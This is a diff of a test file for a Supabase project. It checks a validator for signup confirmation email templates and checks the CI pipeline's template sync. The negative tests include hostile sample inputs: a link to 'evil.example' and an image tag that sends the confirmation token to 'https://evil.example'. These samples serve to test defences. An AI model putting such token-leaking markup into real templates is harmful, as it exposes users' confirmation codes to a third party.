@@ -3,6 +3,7 @@ import { readFile } from 'node:fs/promises';
 
 import {
   isSatisfied,
+  isSafeConfirmationTemplate,
   isSafePasswordChangedTemplate,
   isSafeRecoveryTemplate,
   passwordGuardPatch,
@@ -100,6 +101,62 @@ describe('repository password update guard contract', () => {
     expect(localConfig).toContain('subject = "ICONS 비밀번호 변경 안내"');
     expect(localConfig).toContain('content_path = "./templates/password_changed_notification.html"');
     expect(isSafePasswordChangedTemplate(template)).toBe(true);
+  });
+});
+
+/* 1014-004 가입 확인 코드: 운영 Auth 확인 메일을 사람이 손으로 바꾸던 게이트를 선언 관리로 옮겼다. 앱 배포 전(deploy-supabase)에 반영한다. */
+describe('repository signup confirmation template contract', () => {
+  it('syncs the code-and-link confirmation template before the production app deploy and in every preview', async () => {
+    const [localConfig, pipeline, template] = await Promise.all([
+      readFile(new URL('../supabase/config.toml', import.meta.url), 'utf8'),
+      readFile(new URL('../.github/workflows/pipeline.yml', import.meta.url), 'utf8'),
+      readFile(new URL('../supabase/templates/confirmation.html', import.meta.url), 'utf8'),
+    ]);
+    expect(isSafeConfirmationTemplate(template)).toBe(true);
+    expect(localConfig).toContain('[auth.email.template.confirmation]');
+    expect(localConfig).toContain('subject = "ICONS 가입 확인 코드"');
+    expect(localConfig).toContain('content_path = "./supabase/templates/confirmation.html"');
+    // Production, isolated PR, shared preview and persistent staging each own a sync step.
+    expect(pipeline.match(/CONFIRMATION_TEMPLATE_PATH: supabase\/templates\/confirmation\.html/g)).toHaveLength(4);
+    expect(pipeline.match(/CONFIRMATION_SUBJECT: ICONS 가입 확인 코드/g)).toHaveLength(4);
+    const productionSupabaseJob = pipeline.slice(
+      pipeline.indexOf('  deploy-supabase:'),
+      pipeline.indexOf('  deploy-supabase-preview:'),
+    );
+    expect(productionSupabaseJob).toContain('CONFIRMATION_TEMPLATE_PATH: supabase/templates/confirmation.html');
+    expect(pipeline.indexOf('CONFIRMATION_TEMPLATE_PATH')).toBeLessThan(pipeline.indexOf('- name: Deploy Vercel production'));
+  });
+});
+
+describe('signup confirmation email template contract', () => {
+  const code = '<p>{{ .Token }}</p>';
+  const link = '<a href="{{ .ConfirmationURL }}">confirm</a>';
+
+  it('allows one six-digit code and one confirmation link', () => {
+    expect(isSafeConfirmationTemplate(`${code}${link}`)).toBe(true);
+    expect(isSafeConfirmationTemplate(`<p style="font-size:24px">{{.Token}}</p><a href='{{ .ConfirmationURL }}'>confirm</a>`)).toBe(true);
+  });
+
+  it('rejects a missing or repeated code or link, other variables and hidden markup', () => {
+    expect(isSafeConfirmationTemplate(link)).toBe(false);
+    expect(isSafeConfirmationTemplate(code)).toBe(false);
+    expect(isSafeConfirmationTemplate(`${code}${code}${link}`)).toBe(false);
+    expect(isSafeConfirmationTemplate(`${code}${link}${link}`)).toBe(false);
+    expect(isSafeConfirmationTemplate(`${code}${link}<a href="https://evil.example">help</a>`)).toBe(false);
+    expect(isSafeConfirmationTemplate(`${code}${link}<p>{{ .TokenHash }}</p>`)).toBe(false);
+    expect(isSafeConfirmationTemplate(`${code}${link}<img src="https://evil.example/p?t={{ .Token }}">`)).toBe(false);
+    expect(isSafeConfirmationTemplate(`<!-- ${code} -->${link}`)).toBe(false);
+  });
+
+  it('is satisfied only when the subject and the template match', () => {
+    const base = { site_url: 'https://iconsip.com', uri_allow_list: '' };
+    const confirmation = { subject: 'ICONS 가입 확인 코드', template: `${code}${link}` };
+    expect(isSatisfied({ config: { ...base, mailer_subjects_confirmation: 'ICONS 가입 확인 코드', mailer_templates_confirmation_content: `  ${code}${link}\n` },
+      siteUrl: 'https://iconsip.com', allowList: '', enforceMailer: false, confirmation })).toBe(true);
+    expect(isSatisfied({ config: { ...base, mailer_subjects_confirmation: 'Confirm Your Signup', mailer_templates_confirmation_content: `${code}${link}` },
+      siteUrl: 'https://iconsip.com', allowList: '', enforceMailer: false, confirmation })).toBe(false);
+    expect(isSatisfied({ config: { ...base, mailer_subjects_confirmation: 'ICONS 가입 확인 코드', mailer_templates_confirmation_content: link },
+      siteUrl: 'https://iconsip.com', allowList: '', enforceMailer: false, confirmation })).toBe(false);
   });
 });
 
